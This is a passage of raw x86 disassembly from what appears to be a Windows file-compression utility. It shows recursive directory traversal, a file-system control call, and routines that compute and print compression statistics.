  4030ea:	cmp    ecx,0xffffffff
  4030ed:	jne    0x4030fc
  4030ef:	call   DWORD PTR ds:0x40c048
  4030f5:	test   eax,eax
  4030f7:	jne    0x403124
  4030f9:	mov    ecx,DWORD PTR [ebp-0x34]
  4030fc:	mov    edx,DWORD PTR [ebp-0x30]
  4030ff:	mov    eax,ecx
  403101:	mov    esi,DWORD PTR [ebp-0x38]
  403104:	or     eax,edx
  403106:	mov    eax,DWORD PTR [ebp-0x3c]
  403109:	je     0x40312a
  40310b:	cmp    edx,eax
  40310d:	jg     0x40312a
  40310f:	jl     0x403115
  403111:	cmp    ecx,esi
  403113:	jae    0x40312a
  403115:	add    DWORD PTR [edi+0x20],0x1
  403119:	push   0x64
  40311b:	pop    ebx
  40311c:	push   0x0
  40311e:	pop    eax
  40311f:	adc    DWORD PTR [edi+0x24],eax
  403122:	jmp    0x40313f
  403124:	mov    esi,DWORD PTR [ebp-0x38]
  403127:	mov    eax,DWORD PTR [ebp-0x3c]
  40312a:	add    DWORD PTR [edi+0x28],0x1
  40312e:	mov    ecx,esi
  403130:	push   0x0
  403132:	mov    DWORD PTR [ebp-0x30],eax
  403135:	pop    eax
  403136:	adc    DWORD PTR [edi+0x2c],eax
  403139:	mov    DWORD PTR [ebp-0x34],ecx
  40313c:	push   0x20
  40313e:	pop    ebx
  40313f:	mov    edx,DWORD PTR [ebp-0x30]
  403142:	mov    eax,ecx
  403144:	or     eax,edx
  403146:	je     0x403180
  403148:	cmp    edx,DWORD PTR [ebp-0x3c]
  40314b:	jl     0x40315c
  40314d:	jg     0x403153
  40314f:	cmp    ecx,esi
  403151:	jbe    0x40315c
  403153:	mov    eax,DWORD PTR [ebp-0x30]
  403156:	mov    DWORD PTR [ebp-0x54],ecx
  403159:	mov    DWORD PTR [ebp-0x50],eax
  40315c:	fild   QWORD PTR [ebp-0x54]
  40315f:	fstp   QWORD PTR [ebp-0x5c]
  403162:	fld    QWORD PTR [ebp-0x5c]
  403165:	fild   QWORD PTR [ebp-0x34]
  403168:	fstp   QWORD PTR [ebp-0x5c]
  40316b:	fdiv   QWORD PTR [ebp-0x5c]
  40316e:	mov    eax,DWORD PTR [ebp-0x50]
  403171:	mov    ecx,DWORD PTR [ebp-0x34]
  403174:	mov    DWORD PTR [ebp-0x3c],eax
  403177:	mov    eax,DWORD PTR [ebp-0x54]
  40317a:	mov    DWORD PTR [ebp-0x38],eax
  40317d:	fstp   QWORD PTR [ebp-0x5c]
  403180:	xor    esi,esi
  403182:	cmp    DWORD PTR [edi+0x60],esi
  403185:	je     0x4032e8
  40318b:	test   BYTE PTR [edi],0x8
  40318e:	jne    0x4032e8
  403194:	test   BYTE PTR [edi],0x10
  403197:	jne    0x4031a8
  403199:	mov    eax,DWORD PTR [ebp-0x40]
  40319c:	test   DWORD PTR [eax],0x6
  4031a2:	jne    0x4032e8
  4031a8:	push   edi
  4031a9:	push   0x400
  4031ae:	push   esi
  4031af:	push   0x408440
  4031b4:	push   0x9
  4031b6:	pop    edx
  4031b7:	lea    ecx,[ebp-0x54]
  4031ba:	call   0x402b3b
  4031bf:	push   0x401524
  4031c4:	push   0x400
  4031c9:	push   0x408440
  4031ce:	call   DWORD PTR ds:0x40c160
  4031d4:	mov    ecx,0x408440
  4031d9:	add    esp,0xc
  4031dc:	lea    edx,[ecx+0x2]
  4031df:	mov    ax,WORD PTR [ecx]
  4031e2:	add    ecx,0x2
  4031e5:	cmp    ax,si
  4031e8:	jne    0x4031df
  4031ea:	sub    ecx,edx
  4031ec:	mov    eax,0x400
  4031f1:	sar    ecx,1
  4031f3:	push   edi
  4031f4:	sub    eax,ecx
  4031f6:	push   eax
  4031f7:	push   esi
  4031f8:	lea    eax,[ecx*2+0x408440]
  4031ff:	push   eax
  403200:	push   0x9
  403202:	pop    edx
  403203:	lea    ecx,[ebp-0x34]
  403206:	call   0x402b3b
  40320b:	mov    ecx,0x408440
  403210:	lea    edx,[ecx+0x2]
  403213:	mov    ax,WORD PTR [ecx]
  403216:	add    ecx,0x2
  403219:	cmp    ax,si
  40321c:	jne    0x403213
  40321e:	fld    QWORD PTR [ebp-0x5c]
  403221:	sub    ecx,edx
  403223:	sar    ecx,1
  403225:	mov    eax,0x400
  40322a:	push   ecx
  40322b:	push   ecx
  40322c:	fstp   QWORD PTR [esp]
  40322f:	sub    eax,ecx
  403231:	push   0x40152c
  403236:	push   eax
  403237:	lea    eax,[ecx*2+0x408440]
  40323e:	push   eax
  40323f:	call   DWORD PTR ds:0x40c150
  403245:	lea    ecx,[edi+0x50]
  403248:	add    esp,0x14
  40324b:	lea    edx,[ecx+0x2]
  40324e:	mov    ax,WORD PTR [ecx]
  403251:	add    ecx,0x2
  403254:	cmp    ax,WORD PTR [ebp-0x60]
  403258:	jne    0x40324e
  40325a:	sub    ecx,edx
  40325c:	sar    ecx,1
  40325e:	cmp    ecx,0x1
  403261:	jne    0x403287
  403263:	mov    ecx,0x408440
  403268:	lea    edx,[ecx+0x2]
  40326b:	mov    ax,WORD PTR [ecx]
  40326e:	add    ecx,0x2
  403271:	cmp    ax,WORD PTR [ebp-0x60]
  403275:	jne    0x40326b
  403277:	mov    ax,WORD PTR [edi+0x50]
  40327b:	sub    ecx,edx
  40327d:	sar    ecx,1
  40327f:	mov    WORD PTR [ecx*2+0x40843a],ax
  403287:	mov    esi,DWORD PTR [edi+0x60]
  40328a:	mov    ecx,esi
  40328c:	push   0x408440
  403291:	push   0x15
  403293:	call   DWORD PTR ds:0x40c1a4
  403299:	call   esi
  40329b:	mov    esi,DWORD PTR [edi+0x60]
  40329e:	pop    ecx
  40329f:	pop    ecx
  4032a0:	push   0x18
  4032a2:	mov    ecx,esi
  4032a4:	call   DWORD PTR ds:0x40c1a4
  4032aa:	call   esi
  4032ac:	mov    eax,DWORD PTR [ebp-0x40]
  4032af:	pop    ecx
  4032b0:	add    eax,0x2c
  4032b3:	push   eax
  4032b4:	movzx  eax,bx
  4032b7:	mov    ebx,0x408440
  4032bc:	push   eax
  4032bd:	push   0x401544
  4032c2:	push   0x400
  4032c7:	push   ebx
  4032c8:	call   DWORD PTR ds:0x40c150
  4032ce:	mov    esi,DWORD PTR [edi+0x60]
  4032d1:	add    esp,0x14
  4032d4:	mov    ecx,esi
  4032d6:	push   ebx
  4032d7:	push   0x16
  4032d9:	call   DWORD PTR ds:0x40c1a4
  4032df:	call   esi
  4032e1:	pop    ecx
  4032e2:	pop    ecx
  4032e3:	mov    ecx,DWORD PTR [ebp-0x34]
  4032e6:	xor    esi,esi
  4032e8:	mov    eax,DWORD PTR [ebp-0x38]
  4032eb:	add    DWORD PTR [edi+0x30],eax
  4032ee:	mov    eax,DWORD PTR [ebp-0x3c]
  4032f1:	adc    DWORD PTR [edi+0x34],eax
  4032f4:	mov    al,0x1
  4032f6:	add    DWORD PTR [edi+0x38],ecx
  4032f9:	mov    ecx,DWORD PTR [ebp-0x30]
  4032fc:	adc    DWORD PTR [edi+0x3c],ecx
  4032ff:	add    DWORD PTR [edi+0x18],0x1
  403303:	mov    ecx,DWORD PTR [ebp-0x8]
  403306:	adc    DWORD PTR [edi+0x1c],esi
  403309:	xor    ecx,ebp
  40330b:	pop    edi
  40330c:	pop    esi
  40330d:	pop    ebx
  40330e:	call   0x406fc0
  403313:	mov    esp,ebp
  403315:	pop    ebp
  403316:	ret    0x4
  403319:	int3   
  40331a:	int3   
  40331b:	int3   
  40331c:	int3   
  40331d:	int3   
  40331e:	int3   
  40331f:	int3   
  403320:	mov    edi,edi
  403322:	push   ebp
  403323:	mov    ebp,esp
  403325:	sub    esp,0x270
  40332b:	mov    eax,ds:0x408008
  403330:	xor    eax,ebp
  403332:	mov    DWORD PTR [ebp-0x8],eax
  403335:	mov    eax,DWORD PTR [ebp+0xc]
  403338:	push   ebx
  403339:	mov    ebx,DWORD PTR [ebp+0x8]
  40333c:	mov    ecx,ebx
  40333e:	push   esi
  40333f:	xor    esi,esi
  403341:	mov    DWORD PTR [ebp-0x26c],eax
  403347:	push   edi
  403348:	mov    edi,DWORD PTR [ebp+0x10]
  40334b:	lea    edx,[ecx+0x2]
  40334e:	mov    DWORD PTR [ebp-0x270],esi
  403354:	mov    ax,WORD PTR [ecx]
  403357:	add    ecx,0x2
  40335a:	cmp    ax,si
  40335d:	jne    0x403354
  40335f:	sub    ecx,edx
  403361:	sar    ecx,1
  403363:	push   ebx
  403364:	lea    eax,[ebx+ecx*2]
  403367:	mov    DWORD PTR [ebp-0x260],eax
  40336d:	call   DWORD PTR ds:0x40c064
  403373:	cmp    eax,0xffffffff
  403376:	jne    0x4033aa
  403378:	test   BYTE PTR [edi],0x8
  40337b:	je     0x403382
  40337d:	test   BYTE PTR [edi],0x2
  403380:	jne    0x4033cb
  403382:	cmp    DWORD PTR [edi+0x64],esi
  403385:	je     0x40339e
  403387:	call   DWORD PTR ds:0x40c048
  40338d:	mov    esi,DWORD PTR [edi+0x64]
  403390:	mov    ecx,esi
  403392:	push   eax
  403393:	push   ebx
  403394:	call   DWORD PTR ds:0x40c1a4
  40339a:	call   esi
  40339c:	pop    ecx
  40339d:	pop    ecx
  40339e:	test   BYTE PTR [edi],0x2
  4033a1:	jne    0x4033cb
  4033a3:	xor    al,al
  4033a5:	jmp    0x403696
  4033aa:	mov    esi,DWORD PTR [edi+0x60]
  4033ad:	test   esi,esi
  4033af:	je     0x4033cb
  4033b1:	mov    ecx,esi
  4033b3:	push   ebx
  4033b4:	test   eax,0x800
  4033b9:	je     0x4033bf
  4033bb:	push   0x6
  4033bd:	jmp    0x4033c1
  4033bf:	push   0x7
  4033c1:	call   DWORD PTR ds:0x40c1a4
  4033c7:	call   esi
  4033c9:	pop    ecx
  4033ca:	pop    ecx
  4033cb:	mov    ecx,DWORD PTR [ebp-0x26c]
  4033d1:	add    DWORD PTR [edi+0x10],0x1
  4033d5:	push   0x0
  4033d7:	pop    esi
  4033d8:	adc    DWORD PTR [edi+0x14],esi
  4033db:	lea    edx,[ecx+0x2]
  4033de:	mov    ax,WORD PTR [ecx]
  4033e1:	add    ecx,0x2
  4033e4:	cmp    ax,si
  4033e7:	jne    0x4033de
  4033e9:	sub    ecx,edx
  4033eb:	mov    edx,DWORD PTR [ebp-0x260]
  4033f1:	mov    esi,edx
  4033f3:	sar    ecx,1
  4033f5:	sub    esi,ebx
  4033f7:	sar    esi,1
  4033f9:	lea    eax,[esi+ecx*1]
  4033fc:	cmp    eax,0x104
  403401:	jae    0x403537
  403407:	push   DWORD PTR [ebp-0x26c]
  40340d:	mov    eax,0x104
  403412:	sub    eax,esi
  403414:	push   eax
  403415:	push   edx
  403416:	mov    DWORD PTR [ebp-0x268],eax
  40341c:	call   DWORD PTR ds:0x40c15c
  403422:	add    esp,0xc
  403425:	lea    eax,[ebp-0x25c]
  40342b:	push   eax
  40342c:	push   ebx
  40342d:	call   DWORD PTR ds:0x40c058
  403433:	mov    DWORD PTR [ebp-0x264],eax
  403439:	cmp    eax,0xffffffff
  40343c:	je     0x403531
  403442:	mov    edx,0x401550
  403447:	lea    ecx,[ebp-0x230]
  40344d:	mov    ax,WORD PTR [ecx]
  403450:	cmp    ax,WORD PTR [edx]
  403453:	jne    0x403473
  403455:	test   ax,ax
  403458:	je     0x40346f
  40345a:	mov    ax,WORD PTR [ecx+0x2]
  40345e:	cmp    ax,WORD PTR [edx+0x2]
  403462:	jne    0x403473
  403464:	add    ecx,0x4
  403467:	add    edx,0x4
  40346a:	test   ax,ax
  40346d:	jne    0x40344d
  40346f:	xor    eax,eax
  403471:	jmp    0x403478
  403473:	sbb    eax,eax
  403475:	or     eax,0x1
  403478:	test   eax,eax
  40347a:	je     0x40350a
  403480:	mov    ecx,0x40109c
  403485:	lea    eax,[ebp-0x230]
  40348b:	mov    dx,WORD PTR [eax]
  40348e:	cmp    dx,WORD PTR [ecx]
  403491:	jne    0x4034b1
  403493:	test   dx,dx
  403496:	je     0x4034ad
  403498:	mov    dx,WORD PTR [eax+0x2]
  40349c:	cmp    dx,WORD PTR [ecx+0x2]
  4034a0:	jne    0x4034b1
  4034a2:	add    eax,0x4
  4034a5:	add    ecx,0x4
  4034a8:	test   dx,dx
  4034ab:	jne    0x40348b
  4034ad:	xor    eax,eax
  4034af:	jmp    0x4034b6
  4034b1:	sbb    eax,eax
  4034b3:	or     eax,0x1
  4034b6:	test   eax,eax
  4034b8:	je     0x40350a
  4034ba:	lea    ecx,[ebp-0x230]
  4034c0:	lea    edx,[ecx+0x2]
  4034c3:	mov    ax,WORD PTR [ecx]
  4034c6:	add    ecx,0x2
  4034c9:	cmp    ax,WORD PTR [ebp-0x270]
  4034d0:	jne    0x4034c3
  4034d2:	sub    ecx,edx
  4034d4:	sar    ecx,1
  4034d6:	lea    eax,[ecx+esi*1]
  4034d9:	cmp    eax,0x104
  4034de:	jae    0x40350a
  4034e0:	lea    eax,[ebp-0x230]
  4034e6:	push   eax
  4034e7:	push   DWORD PTR [ebp-0x268]
  4034ed:	push   DWORD PTR [ebp-0x260]
  4034f3:	call   DWORD PTR ds:0x40c15c
  4034f9:	add    esp,0xc
  4034fc:	lea    edx,[ebp-0x25c]
  403502:	mov    ecx,ebx
  403504:	push   edi
  403505:	call   0x402f79
  40350a:	lea    eax,[ebp-0x25c]
  403510:	push   eax
  403511:	push   DWORD PTR [ebp-0x264]
  403517:	call   DWORD PTR ds:0x40c078
  40351d:	test   eax,eax
  40351f:	jne    0x403442
  403525:	push   DWORD PTR [ebp-0x264]
  40352b:	call   DWORD PTR ds:0x40c070
  403531:	mov    edx,DWORD PTR [ebp-0x260]
  403537:	test   BYTE PTR [edi],0x1
  40353a:	je     0x403694
  403540:	lea    eax,[esi+0x1]
  403543:	mov    DWORD PTR [ebp-0x268],eax
  403549:	cmp    eax,0x104
  40354e:	jae    0x403694
  403554:	mov    eax,0x104
  403559:	sub    eax,esi
  40355b:	push   0x401178
  403560:	push   eax
  403561:	push   edx
  403562:	mov    DWORD PTR [ebp-0x264],eax
  403568:	call   DWORD PTR ds:0x40c15c
  40356e:	add    esp,0xc
  403571:	lea    eax,[ebp-0x25c]
  403577:	push   eax
  403578:	push   ebx
  403579:	call   DWORD PTR ds:0x40c058
  40357f:	mov    esi,eax
  403581:	cmp    esi,0xffffffff
  403584:	je     0x403694
  40358a:	mov    edx,0x40109c
  40358f:	lea    ecx,[ebp-0x230]
  403595:	mov    ax,WORD PTR [ecx]
  403598:	cmp    ax,WORD PTR [edx]
  40359b:	jne    0x4035bb
  40359d:	test   ax,ax
  4035a0:	je     0x4035b7
  4035a2:	mov    ax,WORD PTR [ecx+0x2]
  4035a6:	cmp    ax,WORD PTR [edx+0x2]
  4035aa:	jne    0x4035bb
  4035ac:	add    ecx,0x4
  4035af:	add    edx,0x4
  4035b2:	test   ax,ax
  4035b5:	jne    0x403595
  4035b7:	xor    eax,eax
  4035b9:	jmp    0x4035c0
  4035bb:	sbb    eax,eax
  4035bd:	or     eax,0x1
  4035c0:	test   eax,eax
  4035c2:	je     0x403677
  4035c8:	mov    ecx,0x401550
  4035cd:	lea    eax,[ebp-0x230]
  4035d3:	mov    dx,WORD PTR [eax]
  4035d6:	cmp    dx,WORD PTR [ecx]
  4035d9:	jne    0x4035f9
  4035db:	test   dx,dx
  4035de:	je     0x4035f5
  4035e0:	mov    dx,WORD PTR [eax+0x2]
  4035e4:	cmp    dx,WORD PTR [ecx+0x2]
  4035e8:	jne    0x4035f9
  4035ea:	add    eax,0x4
  4035ed:	add    ecx,0x4
  4035f0:	test   dx,dx
  4035f3:	jne    0x4035d3
  4035f5:	xor    eax,eax
  4035f7:	jmp    0x4035fe
  4035f9:	sbb    eax,eax
  4035fb:	or     eax,0x1
  4035fe:	test   eax,eax
  403600:	je     0x403677
  403602:	test   BYTE PTR [ebp-0x25c],0x10
  403609:	je     0x403677
  40360b:	lea    ecx,[ebp-0x230]
  403611:	lea    edx,[ecx+0x2]
  403614:	mov    ax,WORD PTR [ecx]
  403617:	add    ecx,0x2
  40361a:	cmp    ax,WORD PTR [ebp-0x270]
  403621:	jne    0x403614
  403623:	mov    eax,DWORD PTR [ebp-0x268]
  403629:	sub    ecx,edx
  40362b:	sar    ecx,1
  40362d:	add    eax,ecx
  40362f:	cmp    eax,0x104
  403634:	jae    0x403677
  403636:	lea    eax,[ebp-0x230]
  40363c:	push   eax
  40363d:	push   DWORD PTR [ebp-0x264]
  403643:	push   DWORD PTR [ebp-0x260]
  403649:	call   DWORD PTR ds:0x40c15c
  40364f:	add    esp,0xc
  403652:	push   0x401180
  403657:	push   0x104
  40365c:	push   ebx
  40365d:	call   DWORD PTR ds:0x40c160
  403663:	add    esp,0xc
  403666:	push   edi
  403667:	push   DWORD PTR [ebp-0x26c]
  40366d:	push   ebx
  40366e:	call   0x403320
  403673:	test   al,al
  403675:	je     0x4036a9
  403677:	lea    eax,[ebp-0x25c]
  40367d:	push   eax
  40367e:	push   esi
  40367f:	call   DWORD PTR ds:0x40c078
  403685:	test   eax,eax
  403687:	jne    0x40358a
  40368d:	push   esi
  40368e:	call   DWORD PTR ds:0x40c070
  403694:	mov    al,0x1
  403696:	mov    ecx,DWORD PTR [ebp-0x8]
  403699:	pop    edi
  40369a:	pop    esi
  40369b:	xor    ecx,ebp
  40369d:	pop    ebx
  40369e:	call   0x406fc0
  4036a3:	mov    esp,ebp
  4036a5:	pop    ebp
  4036a6:	ret    0xc
  4036a9:	push   esi
  4036aa:	call   DWORD PTR ds:0x40c070
  4036b0:	movsx  eax,BYTE PTR [edi]
  4036b3:	and    eax,0x2
  4036b6:	shr    eax,1
  4036b8:	jmp    0x403696
  4036ba:	int3   
  4036bb:	int3   
  4036bc:	int3   
  4036bd:	int3   
  4036be:	int3   
  4036bf:	int3   
  4036c0:	mov    edi,edi
  4036c2:	push   ebp
  4036c3:	mov    ebp,esp
  4036c5:	and    esp,0xfffffff8
  4036c8:	sub    esp,0x1f4
  4036ce:	mov    eax,ds:0x408008
  4036d3:	xor    eax,esp
  4036d5:	mov    DWORD PTR [esp+0x1f0],eax
  4036dc:	fld1   
  4036de:	xor    edx,edx
  4036e0:	push   ebx
  4036e1:	push   esi
  4036e2:	mov    esi,DWORD PTR [ebp+0x8]
  4036e5:	fstp   QWORD PTR [esp+0xc]
  4036e9:	push   edi
  4036ea:	cmp    DWORD PTR [esi+0x60],edx
  4036ed:	je     0x403856
  4036f3:	mov    ecx,DWORD PTR [esi+0x38]
  4036f6:	mov    eax,DWORD PTR [esi+0x3c]
  4036f9:	mov    DWORD PTR [esp+0x18],ecx
  4036fd:	or     ecx,eax
  4036ff:	mov    DWORD PTR [esp+0x1c],eax
  403703:	je     0x403720
  403705:	fild   QWORD PTR [esi+0x30]
  403708:	fstp   QWORD PTR [esp+0x10]
  40370c:	fld    QWORD PTR [esp+0x10]
  403710:	fild   QWORD PTR [esp+0x18]
  403714:	fstp   QWORD PTR [esp+0x10]
  403718:	fdiv   QWORD PTR [esp+0x10]
  40371c:	fstp   QWORD PTR [esp+0x10]
  403720:	push   esi
  403721:	push   0x20
  403723:	pop    ebx
  403724:	push   ebx
  403725:	push   edx
  403726:	lea    eax,[esp+0x1c4]
  40372d:	xor    edx,edx
  40372f:	push   eax
  403730:	lea    ecx,[esi+0x18]
  403733:	call   0x402b3b
  403738:	push   esi
  403739:	push   ebx
  40373a:	push   0x0
  40373c:	lea    eax,[esp+0x144]
  403743:	xor    edx,edx
  403745:	push   eax
  403746:	lea    ecx,[esi+0x10]
  403749:	call   0x402b3b
  40374e:	push   esi
  40374f:	push   ebx
  403750:	push   0x0
  403752:	lea    eax,[esp+0xc4]
  403759:	xor    edx,edx
  40375b:	push   eax
  40375c:	lea    ecx,[esi+0x20]
  40375f:	call   0x402b3b
  403764:	push   esi
  403765:	push   ebx
  403766:	push   0x0
  403768:	lea    eax,[esp+0x184]
  40376f:	xor    edx,edx
  403771:	push   eax
  403772:	lea    ecx,[esi+0x28]
  403775:	call   0x402b3b
  40377a:	push   esi
  40377b:	push   ebx
  40377c:	push   0x1
  40377e:	lea    eax,[esp+0x84]
  403785:	xor    edx,edx
  403787:	push   eax
  403788:	lea    ecx,[esi+0x38]
  40378b:	call   0x402b3b
  403790:	push   esi
  403791:	push   ebx
  403792:	push   0x1
  403794:	lea    eax,[esp+0x104]
  40379b:	xor    edx,edx
  40379d:	push   eax
  40379e:	lea    ecx,[esi+0x30]
  4037a1:	call   0x402b3b
  4037a6:	push   0x64
  4037a8:	push   0x401558
  4037ad:	lea    eax,[esp+0x6c]
  4037b1:	push   0xa
  4037b3:	push   eax
  4037b4:	call   DWORD PTR ds:0x40c150
  4037ba:	fld    QWORD PTR [esp+0x20]
  4037be:	lea    eax,[esp+0x30]
  4037c2:	pop    ecx
  4037c3:	pop    ecx
  4037c4:	fstp   QWORD PTR [esp]
  4037c7:	push   0x401560
  4037cc:	push   ebx
  4037cd:	push   eax
  4037ce:	call   DWORD PTR ds:0x40c150
  4037d4:	lea    ecx,[esi+0x50]
  4037d7:	add    esp,0x14
  4037da:	lea    edx,[ecx+0x2]
  4037dd:	xor    ebx,ebx
  4037df:	mov    ax,WORD PTR [ecx]
  4037e2:	add    ecx,0x2
  4037e5:	cmp    ax,bx
  4037e8:	jne    0x4037df
  4037ea:	sub    ecx,edx
  4037ec:	sar    ecx,1
  4037ee:	cmp    ecx,0x1
  4037f1:	jne    0x403812
  4037f3:	lea    ecx,[esp+0x20]
  4037f7:	lea    edx,[ecx+0x2]
  4037fa:	mov    ax,WORD PTR [ecx]
  4037fd:	add    ecx,0x2
  403800:	cmp    ax,bx
  403803:	jne    0x4037fa
  403805:	mov    ax,WORD PTR [esi+0x50]
  403809:	sub    ecx,edx
  40380b:	sar    ecx,1
  40380d:	mov    WORD PTR [esp+ecx*2+0x1c],ax
  403812:	mov    esi,DWORD PTR [esi+0x60]
  403815:	lea    eax,[esp+0x20]
  403819:	push   eax
  40381a:	lea    eax,[esp+0x7c]
  40381e:	mov    ecx,esi
  403820:	push   eax
  403821:	lea    eax,[esp+0x100]
  403828:	push   eax
  403829:	lea    eax,[esp+0x184]
  403830:	push   eax
  403831:	lea    eax,[esp+0xc8]
  403838:	push   eax
  403839:	lea    eax,[esp+0x14c]
  403840:	push   eax
  403841:	lea    eax,[esp+0x1d0]
  403848:	push   eax
  403849:	push   0x8
  40384b:	call   DWORD PTR ds:0x40c1a4
  403851:	call   esi
  403853:	add    esp,0x20
  403856:	mov    ecx,DWORD PTR [esp+0x1fc]
  40385d:	pop    edi
  40385e:	pop    esi
  40385f:	pop    ebx
  403860:	xor    ecx,esp
  403862:	call   0x406fc0
  403867:	mov    esp,ebp
  403869:	pop    ebp
  40386a:	ret    0x4
  40386d:	int3   
  40386e:	int3   
  40386f:	int3   
  403870:	int3   
  403871:	int3   
  403872:	mov    edi,edi
  403874:	push   ebp
  403875:	mov    ebp,esp
  403877:	sub    esp,0x4c
  40387a:	mov    eax,ds:0x408008
  40387f:	xor    eax,ebp
  403881:	mov    DWORD PTR [ebp-0x4],eax
  403884:	fld1   
  403886:	mov    eax,ecx
  403888:	push   ebx
  403889:	mov    ebx,DWORD PTR [ebp+0xc]
  40388c:	push   esi
  40388d:	mov    esi,DWORD PTR [ebp+0x8]
  403890:	mov    DWORD PTR [ebp-0x44],edx
  403893:	xor    edx,edx
  403895:	push   edi
  403896:	inc    edx
  403897:	mov    DWORD PTR [ebp-0x1c],eax
  40389a:	test   BYTE PTR [ebx],0x20
  40389d:	push   0x14
  40389f:	fstp   QWORD PTR [ebp-0x38]
  4038a2:	mov    DWORD PTR [ebp-0x20],esi
  4038a5:	mov    WORD PTR [ebp-0x2c],dx
  4038a9:	pop    ecx
  4038aa:	je     0x403ab0
  4038b0:	test   BYTE PTR [esi],0x10
  4038b3:	je     0x4038bc
  4038b5:	mov    al,dl
  4038b7:	jmp    0x403d50
  4038bc:	test   BYTE PTR [ebx],0x4
  4038bf:	jne    0x4038de
  4038c1:	test   DWORD PTR [esi],0x800
  4038c7:	jne    0x4038b5
  4038c9:	mov    ecx,eax
  4038cb:	call   0x4029cd
  4038d0:	test   al,al
  4038d2:	jne    0x403d4e
  4038d8:	push   0x14
  4038da:	xor    edx,edx
  4038dc:	pop    ecx
  4038dd:	inc    edx
  4038de:	xor    eax,eax
  4038e0:	lea    edi,[ebp-0x18]
  4038e3:	stos   DWORD PTR es:[edi],eax
  4038e4:	stos   DWORD PTR es:[edi],eax
  4038e5:	stos   DWORD PTR es:[edi],eax
  4038e6:	stos   DWORD PTR es:[edi],eax
  4038e7:	stos   DWORD PTR es:[edi],eax
  4038e8:	mov    eax,DWORD PTR [ebx+0x4]
  4038eb:	xor    edi,edi
  4038ed:	push   edi
  4038ee:	mov    DWORD PTR [ebp-0xc],eax
  4038f1:	lea    eax,[ebp-0x48]
  4038f4:	push   eax
  4038f5:	push   edi
  4038f6:	push   edi
  4038f7:	push   ecx
  4038f8:	lea    eax,[ebp-0x18]
  4038fb:	mov    DWORD PTR [ebp-0x18],edx
  4038fe:	push   eax
  4038ff:	push   0x9030c
  403904:	push   DWORD PTR [ebp-0x1c]
  403907:	mov    DWORD PTR [ebp-0x14],0x2
  40390e:	mov    DWORD PTR [ebp-0x10],edx
  403911:	call   DWORD PTR ds:0x40c074
  403917:	test   eax,eax
  403919:	jne    0x403939
  40391b:	call   DWORD PTR ds:0x40c048
  403921:	cmp    eax,0x158
  403926:	je     0x403939
  403928:	call   DWORD PTR ds:0x40c048
  40392e:	cmp    eax,0x13d
  403933:	jne    0x403afc
  403939:	cmp    DWORD PTR [ebx+0x60],edi
  40393c:	je     0x4039ea
  403942:	test   BYTE PTR [ebx],0x8
  403945:	jne    0x4039ea
  40394b:	test   BYTE PTR [ebx],0x10
  40394e:	jne    0x40395c
  403950:	test   DWORD PTR [esi],0x6
  403956:	jne    0x4039ea
  40395c:	add    esi,0x2c
  40395f:	push   esi
  403960:	push   0x401570
  403965:	push   0x400
  40396a:	push   0x408440
  40396f:	mov    DWORD PTR [ebp-0x1c],esi
  403972:	call   DWORD PTR ds:0x40c150
  403978:	mov    esi,DWORD PTR [ebx+0x60]
  40397b:	add    esp,0x10
  40397e:	mov    ecx,esi
  403980:	push   0x408440
  403985:	push   0x15
  403987:	call   DWORD PTR ds:0x40c1a4
  40398d:	call   esi
  40398f:	pop    ecx
  403990:	pop    ecx
  403991:	mov    ecx,DWORD PTR [ebp-0x1c]
  403994:	lea    edx,[ecx+0x2]
  403997:	mov    ax,WORD PTR [ecx]
  40399a:	add    ecx,0x2
  40399d:	cmp    ax,di
  4039a0:	jne    0x403997
  4039a2:	sub    ecx,edx
  4039a4:	sar    ecx,1
  4039a6:	push   0x14
  4039a8:	inc    ecx
  4039a9:	pop    eax
  4039aa:	cmp    ecx,eax
  4039ac:	jae    0x4039e7
  4039ae:	sub    eax,ecx
  4039b0:	mov    DWORD PTR [ebp-0x1c],eax
  4039b3:	mov    edi,eax
  4039b5:	push   0x20
  4039b7:	push   0x401578
  4039bc:	push   0x400
  4039c1:	mov    esi,0x408440
  4039c6:	push   esi
  4039c7:	call   DWORD PTR ds:0x40c150
  4039cd:	add    esp,0x10
  4039d0:	push   esi
  4039d1:	mov    esi,DWORD PTR [ebx+0x60]
  4039d4:	mov    ecx,esi
  4039d6:	push   0x15
  4039d8:	call   DWORD PTR ds:0x40c1a4
  4039de:	call   esi
  4039e0:	pop    ecx
  4039e1:	pop    ecx
  4039e2:	sub    edi,0x1
  4039e5:	jne    0x4039b5
  4039e7:	mov    esi,DWORD PTR [ebp-0x20]
  4039ea:	mov    eax,DWORD PTR [esi+0x20]
  4039ed:	mov    DWORD PTR [ebp-0x20],eax
  4039f0:	mov    DWORD PTR [ebp-0x40],eax
  4039f3:	mov    eax,DWORD PTR [esi+0x1c]
  4039f6:	mov    DWORD PTR [ebp-0x1c],eax
  4039f9:	mov    DWORD PTR [ebp-0x3c],eax
  4039fc:	lea    eax,[ebp-0x24]
  4039ff:	push   eax
  403a00:	push   DWORD PTR [ebp-0x44]
  403a03:	call   DWORD PTR ds:0x40c05c
  403a09:	mov    DWORD PTR [ebp-0x28],eax
  403a0c:	cmp    eax,0xffffffff
  403a0f:	jne    0x403a21
  403a11:	call   DWORD PTR ds:0x40c048
  403a17:	test   eax,eax
  403a19:	je     0x403a21
  403a1b:	mov    DWORD PTR [ebp-0x28],edi
  403a1e:	mov    DWORD PTR [ebp-0x24],edi
  403a21:	cmp    DWORD PTR [ebp-0x20],edi
  403a24:	jne    0x403a31
  403a26:	cmp    DWORD PTR [ebp-0x1c],edi
  403a29:	jne    0x403a31
  403a2b:	mov    DWORD PTR [ebp-0x28],edi
  403a2e:	mov    DWORD PTR [ebp-0x24],edi
  403a31:	mov    eax,DWORD PTR [ebp-0x28]
  403a34:	or     eax,DWORD PTR [ebp-0x24]
  403a37:	je     0x403a5a
  403a39:	fild   QWORD PTR [ebp-0x40]
  403a3c:	fstp   QWORD PTR [ebp-0x38]
  403a3f:	fld    QWORD PTR [ebp-0x38]
  403a42:	fild   QWORD PTR [ebp-0x28]
  403a45:	fstp   QWORD PTR [ebp-0x38]
  403a48:	fdiv   QWORD PTR [ebp-0x38]
  403a4b:	mov    eax,DWORD PTR [ebp-0x3c]
  403a4e:	mov    DWORD PTR [ebp-0x1c],eax
  403a51:	mov    eax,DWORD PTR [ebp-0x40]
  403a54:	mov    DWORD PTR [ebp-0x20],eax
  403a57:	fstp   QWORD PTR [ebp-0x38]
  403a5a:	test   BYTE PTR [ebx],0x40
  403a5d:	je     0x403c09
  403a63:	test   BYTE PTR [ebx],0x80
  403a66:	je     0x403d2f
  403a6c:	mov    esi,DWORD PTR [ebx+0x60]
  403a6f:	test   esi,esi
  403a71:	je     0x403d2f
  403a77:	push   edi
